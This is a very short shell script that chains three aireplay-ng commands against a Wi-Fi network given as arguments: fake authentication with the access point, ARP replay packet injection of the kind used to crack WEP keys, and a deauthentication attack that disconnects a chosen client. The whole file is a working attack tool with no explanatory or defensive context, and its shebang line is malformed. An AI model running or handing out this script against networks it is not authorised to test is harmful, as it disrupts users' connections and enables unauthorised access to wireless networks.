#!/sh
aireplay-ng -1 0 -a $2 -h $3 $1
aireplay-ng -3 -b $2 -h $3 $1
aireplay-ng -0 1 -a $2 -c $4 $1
